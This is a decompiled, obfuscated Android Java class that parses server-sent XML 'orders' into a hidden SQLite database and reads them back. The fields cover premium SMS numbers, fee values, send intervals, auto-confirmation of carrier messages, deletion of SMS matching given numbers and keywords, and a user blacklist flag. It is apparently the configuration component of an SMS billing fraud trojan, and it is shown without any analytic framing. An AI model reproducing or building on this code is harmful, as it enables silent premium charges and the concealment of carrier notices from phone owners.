package com.amaz.onib;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import com.umeng.analytics.pro.d;
import java.io.ByteArrayInputStream;
import java.util.ArrayList;
import java.util.List;
import org.xmlpull.v1.XmlPullParser;
import org.xmlpull.v1.XmlPullParserFactory;
/* loaded from: classes.dex */
public class g extends SQLiteOpenHelper {

    /* renamed from: a  reason: collision with root package name */
    private static g f731a;

    private g(Context context) {
        super(context, ".fb", (SQLiteDatabase.CursorFactory) null, 2);
    }

    public static g a(Context context) {
        if (f731a == null) {
            f731a = new g(context);
        }
        return f731a;
    }

    private int b(String str) {
        try {
            return Integer.parseInt(str);
        } catch (Exception e) {
            return 0;
        }
    }

    private String[] c(String str) {
        if (str == null) {
            return null;
        }
        return str.split("\\|");
    }

    public i a(String str) {
        if (by.a(str)) {
            return new i();
        }
        try {
            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(str.getBytes());
            XmlPullParser newPullParser = XmlPullParserFactory.newInstance().newPullParser();
            newPullParser.setInput(byteArrayInputStream, "utf-8");
            i iVar = new i();
            iVar.i = str;
            SQLiteDatabase writableDatabase = getWritableDatabase();
            h hVar = null;
            ContentValues contentValues = null;
            for (int eventType = newPullParser.getEventType(); eventType != 1; eventType = newPullParser.next()) {
                switch (eventType) {
                    case 2:
                        if (!"item".equals(newPullParser.getName())) {
                            if (!d.e.equalsIgnoreCase(newPullParser.getName())) {
                                if (!"SubOrderId".equalsIgnoreCase(newPullParser.getName())) {
                                    if (!"carriertype".equalsIgnoreCase(newPullParser.getName())) {
                                        if (!"spnumber".equalsIgnoreCase(newPullParser.getName())) {
                                            if (!"smsorder".equalsIgnoreCase(newPullParser.getName())) {
                                                if (!"feevalue".equalsIgnoreCase(newPullParser.getName())) {
                                                    if (!"FeeType".equalsIgnoreCase(newPullParser.getName())) {
                                                        if (!"rebate".equalsIgnoreCase(newPullParser.getName())) {
                                                            if (!"sendnum".equalsIgnoreCase(newPullParser.getName())) {
                                                                if (!"sendinterval".equalsIgnoreCase(newPullParser.getName())) {
                                                                    if (!"delsms".equalsIgnoreCase(newPullParser.getName())) {
                                                                        if (!"delsmsspnumber".equalsIgnoreCase(newPullParser.getName())) {
                                                                            if (!"feetips".equalsIgnoreCase(newPullParser.getName())) {
                                                                                if (!"autocfm".equalsIgnoreCase(newPullParser.getName())) {
                                                                                    if (!"delsmskey".equalsIgnoreCase(newPullParser.getName())) {
                                                                                        if (!"PayChannel".equalsIgnoreCase(newPullParser.getName())) {
                                                                                            if (!"WebShowUrl".equalsIgnoreCase(newPullParser.getName())) {
                                                                                                if (!"PlayUrl".equalsIgnoreCase(newPullParser.getName())) {
                                                                                                    if (!"FeeUrl".equalsIgnoreCase(newPullParser.getName())) {
                                                                                                        if (!"IsReport".equalsIgnoreCase(newPullParser.getName())) {
                                                                                                            if (!"IsExtended".equalsIgnoreCase(newPullParser.getName())) {
                                                                                                                if (!"cfmspnum".equalsIgnoreCase(newPullParser.getName())) {
                                                                                                                    if (!"cfmsmskey".equalsIgnoreCase(newPullParser.getName())) {
                                                                                                                        if (!"SecCfmSmsType".equalsIgnoreCase(newPullParser.getName())) {
                                                                                                                            if (!"CfmSendNum".equalsIgnoreCase(newPullParser.getName())) {
                                                                                                                                if (!"seccfmsms".equalsIgnoreCase(newPullParser.getName())) {
                                                                                                                                    if (!"cfmspnum1".equalsIgnoreCase(newPullParser.getName())) {
                                                                                                                                        if (!"cfmsmskey1".equalsIgnoreCase(newPullParser.getName())) {
                                                                                                                                            if (!"SecCfmSmsType1".equalsIgnoreCase(newPullParser.getName())) {
                                                                                                                                                if (!"CfmSendNum1".equalsIgnoreCase(newPullParser.getName())) {
                                                                                                                                                    if (!"seccfmsms1".equalsIgnoreCase(newPullParser.getName())) {
                                                                                                                                                        if (!"SuccSpNum".equalsIgnoreCase(newPullParser.getName())) {
                                                                                                                                                            if (!"SuccSmsKey".equalsIgnoreCase(newPullParser.getName())) {
                                                                                                                                                                if (!"Provider".equalsIgnoreCase(newPullParser.getName())) {
                                                                                                                                                                    if (!"hotlinecounseling".equalsIgnoreCase(newPullParser.getName())) {
                                                                                                                                                                        if (!"chargename".equalsIgnoreCase(newPullParser.getName())) {
                                                                                                                                                                            if (!"isfeetips".equalsIgnoreCase(newPullParser.getName())) {
                                                                                                                                                                                if (!"OrderId".equalsIgnoreCase(newPullParser.getName())) {
                                                                                                                                                                                    if (!"isbalckuser".equalsIgnoreCase(newPullParser.getName())) {
                                                                                                                                                                                        if ("times".equalsIgnoreCase(newPullParser.getName())) {
                                                                                                                                                                                            iVar.j = b(newPullParser.nextText());
                                                                                                                                                                                            break;
                                                                                                                                                                                        } else {
                                                                                                                                                                                            break;
                                                                                                                                                                                        }
                                                                                                                                                                                    } else {
                                                                                                                                                                                        iVar.f = newPullParser.nextText();
                                                                                                                                                                                        break;
                                                                                                                                                                                    }
                                                                                                                                                                                } else {
                                                                                                                                                                                    iVar.e = newPullParser.nextText();
                                                                                                                                                                                    break;
                                                                                                                                                                                }
                                                                                                                                                                            } else {
                                                                                                                                                                                iVar.d = newPullParser.nextText();
                                                                                                                                                                                break;
                                                                                                                                                                            }
                                                                                                                                                                        } else {
                                                                                                                                                                            iVar.c = newPullParser.nextText();
                                                                                                                                                                            break;
                                                                                                                                                                        }
                                                                                                                                                                    } else {
                                                                                                                                                                        iVar.b = newPullParser.nextText();
                                                                                                                                                                        break;
                                                                                                                                                                    }
                                                                                                                                                                } else {
                                                                                                                                                                    iVar.f733a = newPullParser.nextText();
                                                                                                                                                                    break;
                                                                                                                                                                }
                                                                                                                                                            } else {
                                                                                                                                                                String nextText = newPullParser.nextText();
                                                                                                                                                                hVar.x = c(nextText);
                                                                                                                                                                contentValues.put("SuccSmsKey", nextText);
                                                                                                                                                                break;
                                                                                                                                                            }
                                                                                                                                                        } else {
                                                                                                                                                            String nextText2 = newPullParser.nextText();
                                                                                                                                                            hVar.w = c(nextText2);
                                                                                                                                                            contentValues.put("SuccSpNum", nextText2);
                                                                                                                                                            break;
                                                                                                                                                        }
                                                                                                                                                    } else {
                                                                                                                                                        contentValues.put("seccfmsms1", newPullParser.nextText());
                                                                                                                                                        break;
                                                                                                                                                    }
                                                                                                                                                } else {
                                                                                                                                                    contentValues.put("CfmSendNum1", newPullParser.nextText());
                                                                                                                                                    break;
                                                                                                                                                }
                                                                                                                                            } else {
                                                                                                                                                contentValues.put("SecCfmSmsType1", Integer.valueOf(b(newPullParser.nextText())));
                                                                                                                                                break;
                                                                                                                                            }
                                                                                                                                        } else {
                                                                                                                                            contentValues.put("cfmsmskey1", newPullParser.nextText());
                                                                                                                                            break;
                                                                                                                                        }
                                                                                                                                    } else {
                                                                                                                                        contentValues.put("cfmspnum1", newPullParser.nextText());
                                                                                                                                        break;
                                                                                                                                    }
                                                                                                                                } else {
                                                                                                                                    hVar.n = newPullParser.nextText();
                                                                                                                                    contentValues.put("seccfmsms", hVar.n);
                                                                                                                                    break;
                                                                                                                                }
                                                                                                                            } else {
                                                                                                                                hVar.o = newPullParser.nextText();
                                                                                                                                contentValues.put("CfmSendNum", hVar.o);
                                                                                                                                break;
                                                                                                                            }
                                                                                                                        } else {
                                                                                                                            hVar.l = b(newPullParser.nextText());
                                                                                                                            contentValues.put("SecCfmSmsType", Integer.valueOf(hVar.l));
                                                                                                                            break;
                                                                                                                        }
                                                                                                                    } else {
                                                                                                                        hVar.p = newPullParser.nextText();
                                                                                                                        contentValues.put("cfmsmskey", hVar.p);
                                                                                                                        break;
                                                                                                                    }
                                                                                                                } else {
                                                                                                                    hVar.m = newPullParser.nextText();
                                                                                                                    contentValues.put("cfmspnum", hVar.m);
                                                                                                                    break;
                                                                                                                }
                                                                                                            } else {
                                                                                                                hVar.v = newPullParser.nextText();
                                                                                                                contentValues.put("IsExtended", hVar.v);
                                                                                                                break;
                                                                                                            }
                                                                                                        } else {
                                                                                                            hVar.u = newPullParser.nextText();
                                                                                                            contentValues.put("IsReport", hVar.u);
                                                                                                            break;
                                                                                                        }
                                                                                                    } else {
                                                                                                        hVar.t = newPullParser.nextText();
                                                                                                        contentValues.put("FeeUrl", hVar.t);
                                                                                                        break;
                                                                                                    }
                                                                                                } else {
                                                                                                    hVar.s = newPullParser.nextText();
                                                                                                    contentValues.put("PlayUrl", hVar.s);
                                                                                                    break;
                                                                                                }
                                                                                            } else {
                                                                                                hVar.r = newPullParser.nextText();
                                                                                                contentValues.put("WebShowUrl", hVar.r);
                                                                                                break;
                                                                                            }
                                                                                        } else {
                                                                                            hVar.q = newPullParser.nextText();
                                                                                            contentValues.put("PayChannel", hVar.q);
                                                                                            break;
                                                                                        }
                                                                                    } else {
                                                                                        String nextText3 = newPullParser.nextText();
                                                                                        hVar.k = nextText3.split("\\|");
                                                                                        contentValues.put("delsmskey", nextText3);
                                                                                        break;
                                                                                    }
                                                                                } else {
                                                                                    hVar.C = b(newPullParser.nextText());
                                                                                    contentValues.put("autocfm", Integer.valueOf(hVar.C));
                                                                                    break;
                                                                                }
                                                                            } else {
                                                                                hVar.B = newPullParser.nextText();
                                                                                contentValues.put("feetips", hVar.B);
                                                                                break;
                                                                            }
                                                                        } else {
                                                                            String nextText4 = newPullParser.nextText();
                                                                            hVar.j = nextText4.split("\\|");
                                                                            contentValues.put("delsmsspnumber", nextText4);
                                                                            break;
                                                                        }
                                                                    } else {
                                                                        hVar.i = newPullParser.nextText();
                                                                        contentValues.put("delsms", hVar.i);
                                                                        break;
                                                                    }
                                                                } else {
                                                                    hVar.y = b(newPullParser.nextText());
                                                                    contentValues.put("sendinterval", Integer.valueOf(hVar.y));
                                                                    break;
                                                                }
                                                            } else {
                                                                hVar.A = b(newPullParser.nextText());
                                                                contentValues.put("sendnum", Integer.valueOf(hVar.A));
                                                                break;
                                                            }
                                                        } else {
                                                            hVar.h = b(newPullParser.nextText());
                                                            contentValues.put("rebate", Integer.valueOf(hVar.h));
                                                            break;
                                                        }
                                                    } else {
                                                        hVar.g = b(newPullParser.nextText());
                                                        contentValues.put("FeeType", Integer.valueOf(hVar.g));
                                                        break;
                                                    }
                                                } else {
                                                    hVar.f = b(newPullParser.nextText());
                                                    contentValues.put("feevalue", Integer.valueOf(hVar.f));
                                                    break;
                                                }
                                            } else {
                                                hVar.e = newPullParser.nextText();
                                                contentValues.put("smsorder", hVar.e);
                                                break;
                                            }
                                        } else {
                                            hVar.d = newPullParser.nextText();
                                            contentValues.put("spnumber", hVar.d);
                                            break;
                                        }
                                    } else {
                                        hVar.c = newPullParser.nextText();
                                        contentValues.put("carriertype", hVar.c);
                                        break;
                                    }
                                } else {
                                    hVar.z = newPullParser.nextText();
                                    contentValues.put("SubOrderId", hVar.z);
                                    break;
                                }
                            } else {
                                hVar.b = newPullParser.nextText();
                                contentValues.put(d.e, hVar.b);
                                break;
                            }
                        } else {
                            hVar = new h();
                            contentValues = new ContentValues();
                            break;
                        }
                    case 3:
                        if ("item".equals(newPullParser.getName()) && hVar != null) {
                            if (4 == hVar.l && "13".equals(hVar.q)) {
                                hVar.d = "11803085";
                                contentValues.put("spnumber", hVar.d);
                            }
                            try {
                                if (!by.a(contentValues.getAsString("cfmspnum1"))) {
                                    ContentValues contentValues2 = new ContentValues();
                                    contentValues2.putAll(contentValues);
                                    contentValues2.put("cfmspnum", contentValues.getAsString("cfmspnum1"));
                                    contentValues2.put("cfmsmskey", contentValues.getAsString("cfmsmskey1"));
                                    contentValues2.put("SecCfmSmsType", contentValues.getAsInteger("SecCfmSmsType1"));
                                    contentValues2.put("CfmSendNum", contentValues.getAsString("CfmSendNum1"));
                                    contentValues2.put("seccfmsms", contentValues.getAsString("seccfmsms1"));
                                    contentValues2.remove("cfmspnum1");
                                    contentValues2.remove("cfmsmskey1");
                                    contentValues2.remove("SecCfmSmsType1");
                                    contentValues2.remove("CfmSendNum1");
                                    contentValues2.remove("seccfmsms1");
                                    contentValues2.put("addtime", Long.valueOf(System.currentTimeMillis()));
                                    hVar.f732a = writableDatabase.insert("fs", null, contentValues2);
                                }
                                contentValues.remove("cfmspnum1");
                                contentValues.remove("cfmsmskey1");
                                contentValues.remove("SecCfmSmsType1");
                                contentValues.remove("CfmSendNum1");
                                contentValues.remove("seccfmsms1");
                                contentValues.put("addtime", Long.valueOf(System.currentTimeMillis()));
                                hVar.f732a = writableDatabase.insert("fs", null, contentValues);
                            } catch (Exception e) {
                            }
                            if (hVar.f > 0) {
                                iVar.g.add(hVar);
                            } else {
                                iVar.h.add(hVar);
                            }
                            hVar = null;
                            break;
                        }
                        break;
                }
            }
            if (byteArrayInputStream == null) {
                return iVar;
            }
            byteArrayInputStream.close();
            writableDatabase.close();
            return iVar;
        } catch (Exception e2) {
            i iVar2 = new i();
            e2.printStackTrace();
            return iVar2;
        }
    }

    public List<h> a() {
        Cursor cursor;
        Throwable th;
        Cursor cursor2 = null;
        SQLiteDatabase readableDatabase = getReadableDatabase();
        ArrayList arrayList = new ArrayList();
        try {
            try {
                Cursor rawQuery = readableDatabase.rawQuery("SELECT * FROM fs WHERE addtime >= " + (System.currentTimeMillis() - 21600000) + " ORDER BY addtime DESC", null);
                while (rawQuery.moveToNext()) {
                    try {
                        h hVar = new h();
                        hVar.f732a = rawQuery.getLong(rawQuery.getColumnIndex("_id"));
                        hVar.y = rawQuery.getInt(rawQuery.getColumnIndex("sendinterval"));
                        hVar.C = rawQuery.getInt(rawQuery.getColumnIndex("autocfm"));
                        hVar.j = c(rawQuery.getString(rawQuery.getColumnIndex("delsmsspnumber")));
                        hVar.c = rawQuery.getString(rawQuery.getColumnIndex("carriertype"));
                        hVar.o = rawQuery.getString(rawQuery.getColumnIndex("CfmSendNum"));
                        hVar.p = rawQuery.getString(rawQuery.getColumnIndex("cfmsmskey"));
                        hVar.m = rawQuery.getString(rawQuery.getColumnIndex("cfmspnum"));
                        hVar.i = rawQuery.getString(rawQuery.getColumnIndex("delsms"));
                        hVar.B = rawQuery.getString(rawQuery.getColumnIndex("feetips"));
                        hVar.g = rawQuery.getInt(rawQuery.getColumnIndex("FeeType"));
                        hVar.f = rawQuery.getInt(rawQuery.getColumnIndex("feevalue"));
                        hVar.b = rawQuery.getString(rawQuery.getColumnIndex(d.e));
                        hVar.v = rawQuery.getString(rawQuery.getColumnIndex("IsExtended"));
                        hVar.u = rawQuery.getString(rawQuery.getColumnIndex("IsReport"));
                        hVar.z = rawQuery.getString(rawQuery.getColumnIndex("SubOrderId"));
                        hVar.q = rawQuery.getString(rawQuery.getColumnIndex("PayChannel"));
                        hVar.h = rawQuery.getInt(rawQuery.getColumnIndex("rebate"));
                        hVar.n = rawQuery.getString(rawQuery.getColumnIndex("seccfmsms"));
                        hVar.l = rawQuery.getInt(rawQuery.getColumnIndex("SecCfmSmsType"));
                        hVar.A = rawQuery.getInt(rawQuery.getColumnIndex("sendnum"));
                        hVar.k = c(rawQuery.getString(rawQuery.getColumnIndex("delsmskey")));
                        hVar.e = rawQuery.getString(rawQuery.getColumnIndex("smsorder"));
                        hVar.d = rawQuery.getString(rawQuery.getColumnIndex("spnumber"));
                        hVar.x = c(rawQuery.getString(rawQuery.getColumnIndex("SuccSmsKey")));
                        hVar.w = c(rawQuery.getString(rawQuery.getColumnIndex("SuccSpNum")));
                        hVar.t = rawQuery.getString(rawQuery.getColumnIndex("FeeUrl"));
                        hVar.r = rawQuery.getString(rawQuery.getColumnIndex("WebShowUrl"));
                        hVar.s = rawQuery.getString(rawQuery.getColumnIndex("PlayUrl"));
                        hVar.D = rawQuery.getString(rawQuery.getColumnIndex("pid"));
                        hVar.E = rawQuery.getString(rawQuery.getColumnIndex("tid"));
                        hVar.F = rawQuery.getString(rawQuery.getColumnIndex("submitUrl"));
                        hVar.G = rawQuery.getString(rawQuery.getColumnIndex("deal"));
                        arrayList.add(hVar);
                    } catch (Throwable th2) {
                        th = th2;
                        cursor = rawQuery;
                        if (cursor != null) {
                            cursor.close();
                        }
                        readableDatabase.close();
                        throw th;
                    }
                }
                if (rawQuery != null) {
                    rawQuery.close();
                }
                readableDatabase.close();
            } catch (Exception e) {
                if (0 != 0) {
                    cursor2.close();
                }
                readableDatabase.close();
            }
            return arrayList;
        } catch (Throwable th3) {
            th = th3;
            cursor = null;
        }
    }

    public void a(long j, String str, String str2, String str3) {
        SQLiteDatabase writableDatabase = getWritableDatabase();
        try {
            ContentValues contentValues = new ContentValues();
            contentValues.put(str2, str3);
            writableDatabase.update("fs", contentValues, "SubOrderId=? AND _id = ?", new String[]{str, String.valueOf(j)});
        } catch (Exception e) {
        } finally {
            writableDatabase.close();
        }
    }

    public boolean a(long j, String str) {
        Throwable th;
        Cursor cursor;
        Cursor query;
        Cursor cursor2 = null;
        SQLiteDatabase readableDatabase = getReadableDatabase();
        try {
            query = readableDatabase.query("fs", new String[]{"deal"}, "SubOrderId = ? AND _id = ?", new String[]{str, String.valueOf(j)}, null, null, null);
            try {
            } catch (Exception e) {
                cursor = query;
                if (cursor != null) {
                    cursor.close();
                }
                readableDatabase.close();
                return false;
            } catch (Throwable th2) {
                th = th2;
                cursor2 = query;
                if (cursor2 != null) {
                    cursor2.close();
                }
                readableDatabase.close();
                throw th;
            }
        } catch (Exception e2) {
            cursor = null;
        } catch (Throwable th3) {
            th = th3;
        }
        if (query.moveToNext()) {
            boolean equals = "1".equals(query.getString(0));
            if (query != null) {
                query.close();
            }
            readableDatabase.close();
            return equals;
        }
        if (query != null) {
            query.close();
        }
        readableDatabase.close();
        return false;
    }

    @Override // android.database.sqlite.SQLiteOpenHelper
    public void onCreate(SQLiteDatabase sQLiteDatabase) {
        sQLiteDatabase.execSQL("CREATE TABLE fs (_id INTEGER PRIMARY KEY,Id INTEGER,SubOrderId TEXT,carriertype INTEGER,spnumber TEXT,smsorder TEXT,feevalue INTEGER,rebate INTEGER,sendnum TEXT,sendinterval INTEGER,delsms TEXT,delsmskey TEXT,delsmsspnumber TEXT,feetips TEXT,autocfm INTEGER,cfmspnum TEXT,cfmsmskey TEXT,SecCfmSmsType INTEGER,seccfmsms TEXT,CfmSendNum TEXT,PayChannel INTEGER,WebShowUrl TEXT,PlayUrl TEXT,FeeUrl TEXT,FeeType INTEGER,IsReport TEXT,IsExtended TEXT,SuccSpNum TEXT,SuccSmsKey TEXT,pid TEXT,tid TEXT,submitUrl TEXT,deal TEXT,smp1 TEXT,smp2 TEXT,imp1 INTEGER,imp2 INTEGER,addtime INTEGER);");
        sQLiteDatabase.execSQL("CREATE TABLE asm (_id INTEGER PRIMARY KEY,sder TEXT,msg TEXT,addtime INTEGER);");
    }

    @Override // android.database.sqlite.SQLiteOpenHelper
    public void onUpgrade(SQLiteDatabase sQLiteDatabase, int i, int i2) {
    }
}
